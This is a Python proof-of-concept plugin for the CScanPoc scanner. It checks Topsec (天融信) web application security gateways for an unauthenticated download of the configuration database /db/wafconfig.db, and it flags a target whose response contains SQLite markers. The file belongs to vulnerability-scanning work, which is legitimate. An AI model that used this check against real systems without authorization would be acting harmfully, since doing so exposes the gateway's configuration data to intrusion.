# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TOPSEC_0004'  # 平台漏洞编号，留空
    name = '天融信WEB应用安全网关 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-08-03'  # 漏洞公布时间
    desc = '''
        天融信WEB应用安全网关 /db/wafconfig.db 信息泄露。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '天融信'  # 漏洞应用名称
    product_version = '天融信WEB应用安全网关'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f3524f43-f14e-454b-bed9-00f1babd7c03'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref http://www.wooyun.org/bugs/wooyun-2015-0130878
            payload = '/db/wafconfig.db'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            content = req.content

            if req.status_code == 200 and 'SQLite' in content and 'tb_system' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
